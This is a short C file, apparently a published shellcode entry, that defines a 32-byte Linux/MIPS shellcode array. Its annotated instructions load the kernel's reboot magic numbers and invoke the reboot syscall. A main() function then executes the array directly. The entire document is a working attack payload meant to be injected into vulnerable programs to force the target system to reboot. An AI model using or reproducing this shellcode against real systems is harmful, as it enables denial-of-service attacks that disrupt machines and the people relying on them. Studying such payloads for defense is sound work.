/*
 * Title: Linux/MIPS - reboot() - 32 bytes.
 * Author: rigan - imrigan [sobachka] gmail.com
 */

#include <stdio.h>

char sc[] =
         "\x3c\x06\x43\x21"       // lui     a2,0x4321
         "\x34\xc6\xfe\xdc"       // ori     a2,a2,0xfedc
         "\x3c\x05\x28\x12"       // lui     a1,0x2812
         "\x34\xa5\x19\x69"       // ori     a1,a1,0x1969
         "\x3c\x04\xfe\xe1"       // lui     a0,0xfee1
         "\x34\x84\xde\xad"       // ori     a0,a0,0xdead
         "\x24\x02\x0f\xf8"       // li      v0,4088
         "\x01\x01\x01\x0c";      // syscall 0x40404

void main(void)
{
       void(*s)(void);
       printf("size: %d\n", sizeof(sc));
       s = sc;
       s();
}